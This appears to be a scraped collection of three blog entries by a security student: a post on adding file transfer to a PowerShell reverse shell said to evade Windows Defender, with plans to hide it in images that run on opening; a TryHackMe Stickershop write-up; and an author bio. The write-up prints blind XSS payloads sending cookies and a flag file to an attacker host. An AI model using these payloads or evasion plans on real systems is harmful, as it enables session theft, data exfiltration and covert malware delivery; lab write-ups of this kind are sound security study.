content:
Introduction My first project in my career? No. but my first blog on a project.
During the weekends, one of my colleagues Melvin Awuku sent me a powershell script claiming that it can bypass Windows Defender and most basic anti-viruses and give us a reverse shell.sound great? isn’t it? who will not be happy to try such a powerful script since most Metasploit Payloads can’t bypass windows Defender. Though i planned to get some rest during the weekend but i rushed home with curiosity and turned on my laptop to test the script. Now let’s get our hands dirty💀! Testing the script I sent the script to my windows Virtual machine and ran it, with my netcat listener on i got the reverse shell on my machine without windows Defender giving any warning.Sounds fun? there is more to it, Just stick to the end After playing with the reverse shell, i noticed you can only move from one directory to the other and also list the contents of the directory but you can’t do file transfer(download/upload). I was a bit dissapointed since the dream of every hacker is to transfer files(sensitive) and view the contents.I told him and he gave me permission to modify the script.Now let the fun game begin
Modifying the script I studied the script to see how it works and decided to add upload/download(file transfer) function to it.I tried many option but it didn’t work so i decided to use the skill i learnt in File Transfer module on HackTheBox and fortunately it worked. so with download a fie from the victim’s machine to the attacker machine, you just need to encode the file into Base64 string and decode it back on your machine. How to do it?
In your reverse shell just run:
download [filename] to get your base64 string.The decode it on your machine to get the file, to make things easier,i wrote a python script that will help us decode the file by just inputing the base64 string. Now let’s move on to how we can upload a file.Since the reverse shell wasn’t that powerful, i wanted a way to upload metasploit on the machine, run it and get an interactive metasploit shell.To upload a file on the machine,we will encode the file in base64 string and decode it on the machine.I wrote a python script tp decode the file into base64 string so that our job will be easy.Too much theory? let’s get our hands dirty! Now you can just start your multi/handler listener and run the program by typing:
Start-Process -FilePath "new.exe" This is how i spent my weekend plus the two holidays,Now let me go read my slides fo my Wednessday Cloud Computing Exams.Thanks for Reading!!
Conclusion Check out my Github Account for the scripts, But use this for Educational purposes only,and know that Hacking without is illegal
We are currently working on how to embed the script in image or executable(.exe) file so that when a user opens the image the powershell script will run automatically.I will update this blog once we are done, till then Adios!
summary:
Introduction My first project in my career? No. but my first blog on a project.
During the weekends, one of my colleagues Melvin Awuku sent me a powershell script claiming that it can bypass Windows Defender and most basic anti-viruses and give us a reverse shell.sound great? isn’t it? who will not be happy to try such a powerful script since most Metasploit Payloads can’t bypass windows Defender. Though i planned to get some rest during the weekend but i rushed home with curiosity and turned on my laptop to test the script.
title: PowerShell File Transfer & Stealth Execution: Upload, Run, and Evade Detection

content:
Platform: TryHackMe Link: Stickershop Level: Easy To read the flag in this very simple room, we must take advantage of a Cross-Site Scripting vulnerability.
Scanning Using nmap to scan the target:
nmap -sV -sC Target_IP -OG The_Sticker_Shop Results Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-30 19:58 GMT Nmap scan report for 10.10.97.238 Host is up (0.17s latency). Not shown: 998 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 b2:54:8c:e2:d7:67:ab:8f:90:b3:6f:52:c2:73:37:69 (RSA) | 256 14:29:ec:36:95:e5:64:49:39:3f:b4:ec:ca:5f:ee:78 (ECDSA) |_ 256 19:eb:1f:c9:67:92:01:61:0c:14:fe:71:4b:0d:50:40 (ED25519) 8080/tcp open http Werkzeug httpd 3.0.1 (Python 3.8.10) |_http-server-header: Werkzeug/3.0.1 Python/3.8.10 |_http-title: Cat Sticker Shop Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 17.08 seconds we found two open ports; 22(SSH) and 8080(http)
Enumeration At http://stickershop.thm:8080/ we discover a cat sticker shop website. Clicking on the Feedback leads to http://stickershop.thm:8080/submit_feedback, a section for customer feedback. Tried to submit some feedback to see how the server treats the the comments and discovered the feedback is reviewed manually, likely in a staff browser or a vulnerable environment. XSS Exploitation to Obtain the flag This feedback form could be vulnerable to Cross Site Scripting specfically Blind.Let’s start with a test to confirm the avialability of XSS.We start our Netcat Listener and send the payload at http://stickershop.thm:8080/submit_feedback.
<script>document.location='http://Attacker_IP:8080/?cookie='+document.cookie;</script> After submitting the payload we get some responses on our web server, confirming the XSS vulnerability. We already know that the flag is at http://10.10.139.96:8080/flag.txt, so we can use a modified payload in order to receive it on our listener.
'"><script> fetch('http://127.0.0.1:8080/flag.txt') .then(response => response.text()) .then(data => { fetch('http://Attacker_IP:994/?flag=' + encodeURIComponent(data)); }); </script> XSS Payload Explanation The payload starts with “> to break out of an HTML attribute or tag, injecting malicious JavaScript into the webpage. The tag wraps the JavaScript code, enabling it to execute when the injected content is rendered by the victim’s browser. The fetch function sends a request to http://127.0.0.1:8080/flag.txt from the victim’s browser.If the victim’s browser has access to this local server, it will fetch the contents of flag.txt .then(response=>response.text()) onverts the response (presumably text data) into a readable format. The script constructs a URL containing the extracted data and sends it to the attacker’s server (specified by <-IP-Address>:994) encodeURIComponent(data) ensures that special characters in the data are properly escaped, making the URL valid THANK YOU!
summary:
Platform: TryHackMe Link: Stickershop Level: Easy To read the flag in this very simple room, we must take advantage of a Cross-Site Scripting vulnerability.
Scanning Using nmap to scan the target:
nmap -sV -sC Target_IP -OG The_Sticker_Shop Results Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-30 19:58 GMT Nmap scan report for 10.10.97.238 Host is up (0.17s latency). Not shown: 998 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.
title: THM: Stickershop CTF

content:
❓Introduction Hii, I’m Kwesi Larry,Web Application Security Researcher and Bug Bounty Hunter with experience in scripting, networking and linux administration. I Love solving CTF challenges, breaking things (ethically), and sharing my knowledge..I’m currently exploring most security frameworks like The OWASP Top 10, MITRE ATT&CK Framework and SANS Top 25. I mostly use my leisure to do OSINT Investigations and Forensics Investigations.
💡 Skills Penetration Testing: OWASP Top 10, Web Application Testing,Wireless Network Testing. Programming: Python, Bash scripting. Investigations: OSINT Investigations, Forensics Investigations. Security Auditing: Vulnerability Assessment and Penetration Testing, Report writing, Bug Hunting. 🏅 Achievements and Certifications -TryHackMe Junior Penetration Tester certificate here
🎓 Education Senior High School: Opoku Ware School Course: GeneralArts(2020-2023) University: University of Mines and Technology Course: Bsc.Cybersecurity(2025-2028) Work Experience Cybersecurity Instructor at HIVE Consult (Remote- Feb, 2025) 📝 Write-ups Check out my latest security write-ups here.
